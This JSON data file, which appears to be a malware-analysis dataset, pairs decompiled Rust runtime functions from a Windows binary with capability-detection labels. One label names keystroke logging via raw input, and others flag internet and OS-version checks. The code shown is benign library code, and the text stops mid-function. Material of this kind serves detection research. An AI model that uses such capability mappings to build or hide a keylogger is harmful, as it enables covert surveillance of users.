        "decompiled_code": "\nvoid sym.core::fmt::builders::DebugStruct::finish::h23b21303d147094f(int64_t *arg1)\n\n{\n    uchar uVar1;\n    ulong uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    int64_t iVar2;\n    \n    // core::fmt::builders::DebugStruct::finish::h23b21303d147094f\n    if (*(arg1 + 9) != '\\0') {\n        uVar1 = 1;\n        if (*(arg1 + 1) == '\\0') {\n            iVar2 = *arg1;\n            if ((*(iVar2 + 0x30) & 4) == 0) {\n                uVar3 = *(iVar2 + 0x20);\n                iVar2 = *(iVar2 + 0x28);\n                uVar4 = 0x4490ff;\n                uVar5 = 2;\n            }\n            else {\n                uVar3 = *(iVar2 + 0x20);\n                iVar2 = *(iVar2 + 0x28);\n                uVar4 = 0x448ee2;\n                uVar5 = 1;\n            }\n            uVar1 = (**(iVar2 + 0x18))(uVar3, uVar4, uVar5);\n        }\n        *(arg1 + 1) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "5de9a7ea": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t * sym.core::fmt::builders::DebugTuple::field::h5de9a7eab4b37a6b(int64_t *arg1, ulong arg2, int64_t arg3)\n\n{\n    uint *puVar1;\n    char cVar2;\n    uchar uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uchar uStack137;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint *puStack104;\n    int64_t iStack96;\n    uint32_t uStack88;\n    uint uStack84;\n    uchar uStack80;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    \n    // core::fmt::builders::DebugTuple::field::h5de9a7eab4b37a6b\n    if (*(arg1 + 2) == '\\0') {\n        puVar1 = *arg1;\n        iVar5 = arg1[1];\n        uStack88 = puVar1[0xc];\n        if ((uStack88 & 4) == 0) {\n            uVar4 = 0x449096;\n            if (iVar5 == 0) {\n                uVar4 = 0x44c2e5;\n            }\n            cVar2 = (**(*(puVar1 + 10) + 0x18))(*(puVar1 + 8), uVar4, 2 - (iVar5 == 0));\n            uVar3 = 1;\n            if (cVar2 == '\\0') {\n                uVar3 = (**(arg3 + 0x18))(arg2, puVar1);\n            }\n            goto code_r0x004098cd;\n        }\n        if (iVar5 == 0) {\n            cVar2 = (**(*(puVar1 + 10) + 0x18))(*(puVar1 + 8), 0x444bd1, 2);\n            if (cVar2 != '\\0') {\n                uVar3 = 1;\n                iVar5 = 0;\n                goto code_r0x004098cd;\n            }\n            uStack88 = puVar1[0xc];\n        }\n        uStack137 = 1;\n        uStack64 = puVar1[8];\n        uStack60 = puVar1[9];\n        uStack56 = puVar1[10];\n        uStack52 = puVar1[0xb];\n        puStack48 = &uStack137;\n        uStack84 = puVar1[0xd];\n        uStack80 = *(puVar1 + 0xe);\n        uStack136 = *puVar1;\n        uStack132 = puVar1[1];\n        uStack128 = puVar1[2];\n        uStack124 = puVar1[3];\n        uStack120 = puVar1[4];\n        uStack116 = puVar1[5];\n        uStack112 = puVar1[6];\n        uStack108 = puVar1[7];\n        puStack104 = &uStack64;\n        iStack96 = 0x444b88;\n        cVar2 = (**(arg3 + 0x18))(arg2, &uStack136);\n        if (cVar2 == '\\0') {\n            uVar3 = (**(iStack96 + 0x18))(puStack104, 0x444bbf, 2);\n            goto code_r0x004098cd;\n        }\n    }\n    else {\n        iVar5 = arg1[1];\n    }\n    uVar3 = 1;\ncode_r0x004098cd:\n    *(arg1 + 2) = uVar3;\n    arg1[1] = iVar5 + 1;\n    return arg1;\n}\n",
        "token_count": 861
    },
    "aca11a36": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t sym.core::fmt::Formatter::debug_tuple_field1_finish::haca11a36ffb48117\n                   (int64_t arg1, ulong noname_1, ulong noname_2, ulong arg4)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint64_t in_stack_00000028;\n    int64_t iStack48;\n    int64_t iStack40;\n    uint8_t uStack32;\n    char cStack31;\n    \n    // core::fmt::Formatter::debug_tuple_field1_finish::haca11a36ffb48117\n    uStack32 = (**(*(arg1 + 0x28) + 0x18))(*(arg1 + 0x20));\n    iStack40 = 0;\n    cStack31 = '\\0';\n    iStack48 = arg1;\n    sym.core::fmt::builders::DebugTuple::field::h5de9a7eab4b37a6b(&iStack48, arg4, in_stack_00000028);\n    iVar1 = iStack48;\n    uVar4 = in_stack_00000028 & 0xffffffffffffff00 | uStack32;\n    if ((iStack40 != 0) && (uVar4 = CONCAT71((in_stack_00000028 & 0xffffffffffffff00) >> 8, 1),  uStack32 == 0)) {\n        if ((iStack40 == 1) && ((cStack31 != '\\0' && ((*(iStack48 + 0x30) & 4) == 0)))) {\n            cVar2 = (**(*(iStack48 + 0x28) + 0x18))(*(iStack48 + 0x20), 0x448de4, 1);\n            if (cVar2 != '\\0') goto code_r0x00409c49;\n        }\n        uVar3 = (**(*(iVar1 + 0x28) + 0x18))(*(iVar1 + 0x20), 0x44a40b, 1);\n        uVar4 = uVar3;\n    }\ncode_r0x00409c49:\n    return uVar4 & 0xffffffff;\n}\n",
        "token_count": 495
    },
    "62a0ce87": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409e21)\n// WARNING: Removing unreachable block (ram,0x00409e39)\n// WARNING: Removing unreachable block (ram,0x00409e28)\n// WARNING: Removing unreachable block (ram,0x00409e34)\n// WARNING: Removing unreachable block (ram,0x00409fa0)\n// WARNING: Removing unreachable block (ram,0x00409ffb)\n// WARNING: Removing unreachable block (ram,0x00409fa7)\n// WARNING: Removing unreachable block (ram,0x0040a002)\n// WARNING: Removing unreachable block (ram,0x0040a017)\n// WARNING: Removing unreachable block (ram,0x00409fb3)\n\nulong sym._str_as_core::fmt::Debug_::fmt::h62a0ce87af1805eb(uint8_t *arg1, uint8_t *arg2, int64_t arg3)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iVar3;\n    char cVar4;\n    ulong uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint64_t arg2_00;\n    uint8_t *puVar8;\n    uint8_t *arg4;\n    int64_t iVar9;\n    uint8_t *puStack112;\n    \n    // <str as core::fmt::Debug>::fmt::h62a0ce87af1805eb\n    uVar5 = *(arg3 + 0x20);\n    iVar2 = *(arg3 + 0x28);\n    UNRECOVERED_JUMPTABLE = *(iVar2 + 0x20);\n    arg2_00 = 0x22;\n    cVar4 = (*UNRECOVERED_JUMPTABLE)();\n    if (cVar4 == '\\0') {\n        if (arg2 != NULL) {\n            arg4 = NULL;\n            puVar8 = arg1;\n            do {\n                uVar1 = *puVar8;\n                uVar7 = uVar1;\n                if (uVar1 < '\\0') {\n                    uVar6 = puVar8[1] & 0x3f;\n                    arg2_00 = uVar6;\n                    if (uVar1 < 0xe0) {\n                        puStack112 = puVar8 + 2;\n                        uVar7 = (uVar7 & 0x1f) << 6 | uVar6;\n                    }\n                    else {\n                        arg2_00 = uVar6 << 6;\n                        uVar6 = puVar8[2] & 0x3f | uVar6 << 6;\n                        if (uVar1 < 0xf0) {\n                            puStack112 = puVar8 + 3;\n                            uVar7 = uVar6 | (uVar7 & 0x1f) << 0xc;\n                        }\n                        else {\n                            uVar7 = puVar8[3] & 0x3f | uVar6 << 6 | (uVar7 & 7) << 0x12;\n                            arg2_00 = uVar7;\n                            if (uVar7 == 0x110000) break;\n                            puStack112 = puVar8 + 4;\n                        }\n                    }\n                }\n                else {\n                    puStack112 = puVar8 + 1;\n                }\n                iVar9 = 2;\n    // switch table (35 cases) at 0x40a030\n                switch(uVar7) {\n                case 0:\n                    goto code_r0x00409e10;\n                case 1:\n                case 2:\n                case 3:\n                case 4:\n                case 5:\n                case 6:\n                case 7:\n                case 8:\n                case 0xb:\n                case 0xc:\n                case 0xe:\n                case 0xf:\n                case 0x10:\n                case 0x11:\n                case 0x12:\n                case 0x13:\n                case 0x14:\n                case 0x15:\n                case 0x16:\n                case 0x17:\n                case 0x18:\n                case 0x19:\n                case 0x1a:\n                case 0x1b:\n                case 0x1c:\n                case 0x1d:\n                case 0x1e:\n                case 0x1f:\n                case 0x20:\n                case 0x21:\n                    goto code_r0x00409da0;\n                case 9:\n                    goto code_r0x00409e10;\n                case 10:\n                    goto code_r0x00409e10;\n                case 0xd:\n                    goto code_r0x00409e10;\n                }\n                if (uVar7 == 0x5c) goto code_r0x00409e10;\ncode_r0x00409da0:\n                cVar4 = dbg.lookup(uVar7);\n                if ((cVar4 != '\\0') || (cVar4 = dbg.is_printable(uVar7, arg2_00),  cVar4 == '\\0')) {\n                    iVar3 = 0x1f;\n                    if ((uVar7 | 1) != 0) {\n                        for (; (uVar7 | 1) >> iVar3 == 0; iVar3 = iVar3 + -1) {\n                        }\n                    }\n                    iVar9 = 3;\ncode_r0x00409e10:\n                    if (arg4 != NULL) {\n                        if (arg4 < arg2) {\n                            if (arg1[arg4] < -0x40) {\ncode_r0x0040a019:\n                                dbg.slice_error_fail(arg1, arg2, 0, arg4);\n                                do {\n                                    invalidInstructionException();\n                                } while( true );\n                            }\n                        }\n                        else if (arg4 != arg2) goto code_r0x0040a019;\n                    }\n                    cVar4 = (**(iVar2 + 0x18))(uVar5, arg1, arg4);\n                    if (cVar4 != '\\0') {\n                        return 1;\n                    }\n    // WARNING: Could not recover jumptable at 0x00409eb9. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (10 cases) at 0x40a0bc\n                    uVar5 = (*(*(iVar9 * 4 + 0x40a0bc) + 0x40a0bc))();\n                    return uVar5;\n                }\n                arg4 = puStack112 + (arg4 - puVar8);\n                puVar8 = puStack112;\n            } while (puStack112 != arg2 + arg1);\n        }\n        cVar4 = (**(iVar2 + 0x18))(uVar5, arg1, arg2);\n        if (cVar4 == '\\0') {\n    // WARNING: Could not recover jumptable at 0x00409ff8. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar5 = (*UNRECOVERED_JUMPTABLE)(uVar5, 0x22);\n            return uVar5;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1589
    },
    "14326fed": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym._char_as_core::fmt::Display_::fmt::h14326fedf7fcab8e(uint32_t *arg1, int64_t *arg2)\n\n{\n    uchar uVar1;\n    ulong arg3;\n    uint32_t uStack4;\n    \n    // <char as core::fmt::Display>::fmt::h14326fedf7fcab8e\n    uStack4 = *arg1;\n    if ((*arg2 != 1) && (arg2[2] != 1)) {\n    // WARNING: Could not recover jumptable at 0x0040a115. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(arg2[5] + 0x20))(arg2[4], uStack4, *(arg2[5] + 0x20));\n        return;\n    }\n    uVar1 = uStack4;\n    if (uStack4 < 0x80) {\n        uStack4 = uStack4 & 0xff;\n        arg3 = 1;\n    }\n    else if (uStack4 < 0x800) {\n        uStack4 = (CONCAT11(uVar1, uStack4 >> 6) | 0xc0) & 0xffff3fff | 0x8000;\n        arg3 = 2;\n    }\n    else if (uStack4 < 0x10000) {\n        uStack4 = (CONCAT12(uVar1, CONCAT11(uStack4 >> 6, uStack4 >> 0xc)) & 0xff3fff | 0x80e0) & 0xff3fffff | 0x800000;\n        arg3 = 3;\n    }\n    else {\n        uStack4 = CONCAT13(uVar1, CONCAT12(uStack4 >> 6, CONCAT11(uStack4 >> 0xc, uStack4 >> 0x12))) & 0x3f3f3fff |\n                  0x808080f0;\n        arg3 = 4;\n    }\n    dbg.pad(arg2, &uStack4, arg3);\n    return;\n}\n",
        "token_count": 465
    },
    "d83f0553": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t sym._core::num::error::ParseIntError_as_core::fmt::Debug_::fmt::hd83f0553c6328d0e(ulong arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    int64_t iStack32;\n    uint8_t uStack24;\n    char cStack23;\n    ulong uStack16;\n    int64_t iVar3;\n    \n    // <core::num::error::ParseIntError as core::fmt::Debug>::fmt::hd83f0553c6328d0e\n    uStack16 = arg1;\n    uStack24 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), 0x445731, 0xd);\n    cStack23 = '\\0';\n    iStack32 = arg2;\n    uVar1 = dbg.field(&iStack32, 0x44a362, 4, &uStack16);\n    uVar2 = uVar1 & 0xffffffffffffff00 | uStack24;\n    if ((cStack23 != '\\0') && (uVar2 = CONCAT71((uVar1 & 0xffffffffffffff00) >> 8, 1),  uStack24 == 0)) {\n        if ((*(iStack32 + 0x30) & 4) == 0) {\n            uVar4 = *(iStack32 + 0x20);\n            iVar3 = *(iStack32 + 0x28);\n            uVar5 = 0x4490ff;\n            uVar6 = 2;\n        }\n        else {\n            uVar4 = *(iStack32 + 0x20);\n            iVar3 = *(iStack32 + 0x28);\n            uVar5 = 0x448ee2;\n            uVar6 = 1;\n        }\n        uVar2 = (**(iVar3 + 0x18))(uVar4, uVar5, uVar6);\n    }\n    return uVar2;\n}\n",
        "token_count": 469
    },
    "7ffa5d8a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint64_t sym._core::str::error::Utf8Error_as_core::fmt::Debug_::fmt::h7ffa5d8ab5cd8459(int64_t arg1, int64_t arg2)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    int64_t iStack40;\n    uint8_t uStack32;\n    char cStack31;\n    int64_t iStack24;\n    int64_t iStack16;\n    int64_t iVar3;\n    \n    // <core::str::error::Utf8Error as core::fmt::Debug>::fmt::h7ffa5d8ab5cd8459\n    iStack16 = arg1 + 8;\n    iStack24 = arg1;\n    uStack32 = (**(*(arg2 + 0x28) + 0x18))(*(arg2 + 0x20), 0x44578a, 9);\n    cStack31 = '\\0';\n    iStack40 = arg2;\n    dbg.field(&iStack40, 0x445793, 0xb, &iStack24);\n    uVar1 = dbg.field(&iStack40, 0x44579e, 9, &iStack16);\n    uVar2 = uVar1 & 0xffffffffffffff00 | uStack32;\n    if ((cStack31 != '\\0') && (uVar2 = CONCAT71((uVar1 & 0xffffffffffffff00) >> 8, 1),  uStack32 == 0)) {\n        if ((*(iStack40 + 0x30) & 4) == 0) {\n            uVar4 = *(iStack40 + 0x20);\n            iVar3 = *(iStack40 + 0x28);\n            uVar5 = 0x4490ff;\n            uVar6 = 2;\n        }\n        else {\n            uVar4 = *(iStack40 + 0x20);\n            iVar3 = *(iStack40 + 0x28);\n            uVar5 = 0x448ee2;\n            uVar6 = 1;\n        }\n        uVar2 = (**(iVar3 + 0x18))(uVar4, uVar5, uVar6);\n    }\n    return uVar2;\n}\n",
        "token_count": 514
    },
    "eb58acba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid sym.core::ptr::drop_in_place_core::option::Option_crossbeam_epoch::collector::LocalHandle__::heb58acba52a62f7a\n               (int64_t *arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t *puVar2;\n    uint64_t uVar3;\n    uint64_t uVar4;\n    uint64_t *puStack24;\n    \n    // core::ptr::drop_in_place<core::option::Option<crossbeam_epoch::collector::LocalHandle>>::heb58acba52a62f7a\n    if (*arg1 != 0) {\n        puVar2 = arg1[1];\n        uVar3 = puVar2[0x105];\n        puVar2[0x105] = uVar3 - 1;\n        if ((puVar2[0x104] == 0) && (uVar3 == 1)) {\n            puVar2[0x105] = 1;\n            uVar3 = puVar2[0x104];\n            uVar4 = uVar3 + 1;\n            puStack24 = puVar2;\n            if (uVar4 != 0) {\n                puVar2[0x104] = uVar4;\n                if (uVar3 == 0) {\n                    LOCK();\n                    puVar1 = puVar2 + 1;\n                    *puVar1 = *puVar1 ^ (*puVar1 == 0) * (*puVar1 ^ (*(puVar2[2] + 0x180) | 1));\n                    uVar3 = puVar2[0x106];\n                    puVar2[0x106] = uVar3 + 1;\n                    if ((uVar3 & 0x7f) == 0) {\n                        sym.crossbeam_epoch::internal::Global::collect::h6708353a970a45c2(puVar2[2] + 0x80);\n                    }\n                }\n                puVar1 = puStack24;\n                sym.crossbeam_epoch::internal::Global::push_bag::h676195a937628f8d(puVar2[2] + 0x80);\n                if (((puVar1 != NULL) && (uVar3 = puVar1[0x104],  puVar1[0x104] = uVar3 - 1,  uVar3 == 1)) &&\n                   (puVar1[1] = 0,  puVar1[0x105] == 0)) {\n                    sym.crossbeam_epoch::internal::Local::finalize::hfd518d3b47aa7efc(puVar1);\n                }\n                puVar2[0x105] = 0;\n                puStack24 = puVar2[2];\n                LOCK();\n                *puVar2 = *puVar2 | 1;\n                sym.core::ptr::drop_in_place_crossbeam_epoch::collector::Collector_::hc8b5a31c7f8871af(&puStack24);\n                return;\n            }\n            dbg.panic(0x44bcbb, 0x2b, 0x448598);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n    }\n    return;\n}\n",
        "token_count": 705
    },
    "fd518d3b": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.crossbeam_epoch::internal::Local::finalize::hfd518d3b47aa7efc(uint64_t *arg1)\n\n{\n    uint64_t *puVar1;\n    uint64_t uVar2;\n    uint64_t uVar3;\n    uint64_t *puStack24;\n    \n    // crossbeam_epoch::internal::Local::finalize::hfd518d3b47aa7efc\n    arg1[0x105] = 1;\n    uVar2 = arg1[0x104];\n    uVar3 = uVar2 + 1;\n    puStack24 = arg1;\n    if (uVar3 != 0) {\n        arg1[0x104] = uVar3;\n        if (uVar2 == 0) {\n            LOCK();\n            puVar1 = arg1 + 1;\n            *puVar1 = *puVar1 ^ (*puVar1 == 0) * (*puVar1 ^ (*(arg1[2] + 0x180) | 1));\n            uVar2 = arg1[0x106];\n            arg1[0x106] = uVar2 + 1;\n            if ((uVar2 & 0x7f) == 0) {\n                sym.crossbeam_epoch::internal::Global::collect::h6708353a970a45c2(arg1[2] + 0x80);\n            }\n        }\n        puVar1 = puStack24;\n        sym.crossbeam_epoch::internal::Global::push_bag::h676195a937628f8d(arg1[2] + 0x80);\n        if (((puVar1 != NULL) && (uVar2 = puVar1[0x104],  puVar1[0x104] = uVar2 - 1,  uVar2 == 1)) &&\n           (puVar1[1] = 0,  puVar1[0x105] == 0)) {\n            sym.crossbeam_epoch::internal::Local::finalize::hfd518d3b47aa7efc(puVar1);\n        }\n        arg1[0x105] = 0;\n        puStack24 = arg1[2];\n        LOCK();\n        *arg1 = *arg1 | 1;\n        sym.core::ptr::drop_in_place_crossbeam_epoch::collector::Collector_::hc8b5a31c7f8871af(&puStack24);\n        return;\n    }\n    dbg.panic(0x44bcbb, 0x2b, 0x448598);\n    do {\n        invalidInstructionException();\n    } while( true );\n}\n",
        "token_count": 570
    },
    "6708353a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t sym.crossbeam_epoch::internal::Global::collect::h6708353a970a45c2(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    uint64_t uVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    uint64_t *puVar5;\n    ulong in_RDX;\n    uint64_t *puVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    bool bVar9;\n    uchar auStackX8 [32];\n    ulong uStack72;\n    \n    // crossbeam_epoch::internal::Global::collect::h6708353a970a45c2\n    uStack72 = 0x40b724;\n    iVar3 = dbg.___chkstk_ms(arg1);\n    iVar3 = -iVar3;\n    uVar7 = arg1[0x20];\n    uVar1 = arg1[0x30];\n    puVar6 = arg1 + 0x30;\n    do {\n        while( true ) {\n            uVar4 = uVar1;\n            puVar5 = uVar4 & 0xfffffffffffffff8;\n            if (puVar5 == NULL) {\n                uVar7 = uVar7 + 2;\n                arg1[0x20] = uVar7;\n                goto code_r0x0040b7ad;\n            }\n            uVar1 = *puVar5;\n            if ((uVar1 & 7) == 1) break;\n            puVar6 = puVar5;\n            if (((puVar5[1] & 1) != 0) && (uVar4 = puVar5[1] & 0xfffffffffffffffe,  uVar4 != uVar7)) {\ncode_r0x0040b7ad:\n                iVar8 = 0;\n                do {\n                    if (iVar8 == 8) {\n                        return uVar4;\n                    }\n                    iVar8 = iVar8 + 1;\n                    while( true ) {\n                        uVar1 = *arg1;\n                        uVar4 = *((uVar1 & 0xfffffffffffffff8) + 0x810);\n                        puVar6 = uVar4 & 0xfffffffffffffff8;\n                        if (puVar6 == NULL) {\n                            return uVar1 & 0xfffffffffffffff8;\n                        }\n                        if (uVar7 - (*puVar6 & 0xfffffffffffffffe) < 4) {\n                            return *puVar6 & 0xfffffffffffffffe;\n                        }\n                        LOCK();\n                        uVar2 = *arg1;\n                        *arg1 = *arg1 ^ (uVar1 == uVar2) * (*arg1 ^ uVar4);\n                        if (uVar1 == uVar2) break;\n                        *(&stack0xfffffffffffffff0 + iVar3) = 1;\n                        *(&stack0xffffffffffffffb8 + iVar3) = 0x40b81b;\n                        sym._ZN4core3ptr124drop_in_place_LT_core..result..Result_LT_core..option..Option_LT_crossbeam_epoch..internal..SealedBag_GT__C__LP\n                                  (&stack0xfffffffffffffff0 + iVar3);\n                    }\n                    if (uVar1 == arg1[0x10]) {\n                        LOCK();\n                        puVar5 = arg1 + 0x10;\n                        *puVar5 = *puVar5 ^ (uVar1 == *puVar5) * (*puVar5 ^ uVar4);\n                    }\n                    *(&stack0xffffffffffffffb8 + iVar3) = 0x40b840;\n                    sym.crossbeam_epoch::guard::Guard::defer_unchecked::h7ae233d637756e7f(in_RDX, uVar1);\n                    *(&stack0xffffffffffffffe8 + iVar3) = *puVar6;\n                    uVar1 = puVar6[1];\n                    *(&stack0xffffffffffffffb8 + iVar3) = 0x40b864;\n                    sym.memcpy(&stack0x00000008 + iVar3, puVar6 + 2, 0x800);\n                    *(&stack0xffffffffffffffb8 + iVar3) = 0x40b875;\n                    uVar4 = sym.memcpy(&stack0x00000808 + iVar3, puVar6 + 2, 0x800);\n                    if (uVar1 == 0) {\n                        return uVar4;\n                    }\n                    *(&stack0xfffffffffffffff0 + iVar3) = *(&stack0xffffffffffffffe8 + iVar3);\n                    *(&stack0xfffffffffffffff8 + iVar3) = uVar1;\n                    *(&stack0xffffffffffffffb8 + iVar3) = 0x40b89c;\n                    sym.memcpy(&stack0x00000000 + iVar3, &stack0x00000808 + iVar3, 0x800);\n                    *(&stack0xffffffffffffffb8 + iVar3) = 0x40b8a6;\n                    uVar4 = sym._crossbeam_epoch::internal::Bag_as_core::ops::drop::Drop_::drop::h6824702aae2f0818\n                                      (&stack0xfffffffffffffff8 + iVar3);\n                } while( true );\n            }\n        }\n        LOCK();\n        bVar9 = uVar4 == *puVar6;\n        *puVar6 = *puVar6 ^ bVar9 * (*puVar6 ^ uVar1 & 0xfffffffffffffff8);\n        uVar4 = uVar4 ^ !bVar9 * (uVar4 ^ *puVar6);\n        if (bVar9) {\n            *(&stack0xffffffffffffffb8 + iVar3) = 0x40b774;\n            sym._ZN131__LT_crossbeam_epoch..internal..Local_u20_as_u20_crossbeam_epoch..sync..list..IsElement_LT_crossbeam_epoch..internal..Lo\n                      (puVar5, in_RDX);\n            uVar4 = uVar1 & 0xfffffffffffffff8;\n        }\n        uVar1 = uVar4;\n    } while ((uVar4 & 7) == 0);\n    uVar4 = arg1[0x30];\n    goto code_r0x0040b7ad;\n}\n",
        "token_count": 1342
    },
    "da4bd2b9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid sym.alloc::sync::Arc_T_::drop_slow::hda4bd2b9c1c47770(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t arg1_00;\n    uint64_t uVar2;\n    int64_t iVar3;\n    ulong arg1_01;\n    int64_t iVar4;\n    uint64_t uVar5;\n    uint64_t *puVar6;\n    uint64_t uVar7;\n    uint *puVar8;\n    uint in_XMM6_Da;\n    uint uVar9;\n    uint in_XMM6_Db;\n    uint uVar10;\n    uint in_XMM6_Dc;\n    uint uVar11;\n    uint in_XMM6_Dd;\n    uint uVar12;\n    uchar auStackX8 [32];\n    ulong uStack64;\n    \n    // alloc::sync::Arc<T>::drop_slow::hda4bd2b9c1c47770\n    uStack64 = 0x40b9be;\n    iVar4 = dbg.___chkstk_ms(arg1);\n    iVar4 = -iVar4;\n    *(&stack0x00001018 + iVar4) = CONCAT412(in_XMM6_Dd, CONCAT48(in_XMM6_Dc, CONCAT44(in_XMM6_Db, in_XMM6_Da)));\n    arg1_00 = *arg1;\n    uVar7 = *(arg1_00 + 0x200);\n    while (puVar6 = uVar7 & 0xfffffffffffffff8,  puVar6 != NULL) {\n        uVar7 = *puVar6;\n        uVar5 = uVar7 & 7;\n        *(&stack0x00000808 + iVar4) = uVar5;\n        if (uVar5 != 1) {\n            *(&stack0xfffffffffffffff0 + iVar4) = 0;\n            *(&stack0xffffffffffffffc0 + iVar4) = 0x40bb38;\n            sym.core::panicking::assert_failed::h272e868455368c21\n                      (&stack0x00000808 + iVar4, 0x4483d0, &stack0xfffffffffffffff0 + iVar4, 0x445bf8);\n            do {\n                invalidInstructionException();\n            } while( true );\n        }\n        *(&stack0xffffffffffffffc0 + iVar4) = 0x40ba05;\n        sym._ZN131__LT_crossbeam_epoch..internal..Local_u20_as_u20_crossbeam_epoch..sync..list..IsElement_LT_crossbeam_epoch..internal..Lo\n                  (puVar6, 0x445b60);\n    }\ncode_r0x0040ba25:\n    do {\n        uVar7 = *(arg1_00 + 0x80);\n        uVar5 = *((uVar7 & 0xfffffffffffffff8) + 0x810);\n        puVar8 = uVar5 & 0xfffffffffffffff8;\n        if (puVar8 == NULL) {\n            *(&stack0x00000000 + iVar4) = 0;\n        }\n        else {\n            LOCK();\n            puVar6 = arg1_00 + 0x80;\n            uVar2 = *puVar6;\n            *puVar6 = *puVar6 ^ (uVar7 == uVar2) * (*puVar6 ^ uVar5);\n            if (uVar7 != uVar2) {\n                *(&stack0xfffffffffffffff0 + iVar4) = 1;\n                *(&stack0xffffffffffffffc0 + iVar4) = 0x40ba62;\n                sym._ZN4core3ptr124drop_in_place_LT_core..result..Result_LT_core..option..Option_LT_crossbeam_epoch..internal..SealedBag_GT__C__LP\n                          (&stack0xfffffffffffffff0 + iVar4);\n                goto code_r0x0040ba25;\n            }\n            if (uVar7 == *(arg1_00 + 0x100)) {\n                LOCK();\n                puVar6 = arg1_00 + 0x100;\n                *puVar6 = *puVar6 ^ (uVar7 == *puVar6) * (*puVar6 ^ uVar5);\n            }\n            *(&stack0xffffffffffffffc0 + iVar4) = 